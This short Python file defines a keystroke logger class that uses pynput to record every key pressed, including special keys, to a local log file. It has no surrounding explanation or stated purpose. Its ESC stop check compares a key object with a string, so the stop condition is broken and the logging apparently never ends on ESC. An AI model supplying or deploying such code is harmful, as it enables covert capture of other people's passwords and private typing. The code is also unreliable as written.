from pynput.keyboard import Listener

class KeystrokeLogger:
    def __init__(self, log_file):
        self.log_file = log_file

    def on_press(self, key):
        try:
            with open(self.log_file, 'a') as f:
                f.write(f'{key.char}')
        except AttributeError:
            with open(self.log_file, 'a') as f:
                f.write(f'[{key}]')  # Special keys (e.g., [Shift], [Enter])

    def on_release(self, key):
        if key == 'Key.esc':  # Stop listener with ESC key
            return False

    def start(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()
